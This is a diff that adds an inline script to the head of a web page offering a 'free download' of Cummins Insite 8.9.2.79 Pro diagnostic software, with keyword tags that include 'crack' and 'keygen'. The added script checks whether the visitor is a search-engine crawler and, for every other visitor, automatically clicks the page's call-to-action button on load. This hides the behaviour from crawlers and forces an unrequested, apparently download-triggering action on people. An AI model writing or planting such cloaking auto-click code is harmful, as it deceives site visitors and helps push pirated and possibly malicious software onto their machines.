@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins Insite 8.9.2.79 Pro level</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Cummins Insite 8.9.2.79 Pro level diagnostic software. Supports multiple languages and Cummins inline hardware for engine troubleshooting.">
     <meta name="keywords" content="Cummins Insite 8.9.2.79 Pro level, Cummins Insite 8.9.2.79 download, Cummins Insite 8.9.2.79 free download, Cummins Insite Pro level software, Cummins Insite diagnostic software, Cummins Insite diagnostic software download, Cummins Insite diagnostic software free download, Cummins Insite diagnostic software crack, Cummins Insite diagnostic software keygen, Cummins Insite 8.9.2.79 free, Cummins Insite 8.9.2.79 high speed download, Cummins Insite engine diagnostics, Cummins electronic engines troubleshooting, Cummins engine performance information, Cummins inline hardware support, Cummins Insite Windows 10, Cummins Insite Windows 11, Cummins diagnostic tools, Cummins fleet management, Cummins engine reflash, Cummins fault code diagnostics, Cummins step-by-step troubleshooting, Cummins accurate diagnosis, Cummins wiring diagrams, Cummins ECM security, Cummins INCAL feature, Cummins Insite engine calibration, Cummins Insite pro functions, куммiнс диагностическое программное обеспечение, куммiнс диагностическое программное обеспечение загрузить, куммiнс диагностическое программное обеспечение бесплатно, куммiнс инлайн оборудование, Cummins Insite 8.9.2.79 скачать, Cummins Insite 8.9.2.79 бесплатно скачать, Cummins Insite 8.9.2.79 программное обеспечение">
     <style>
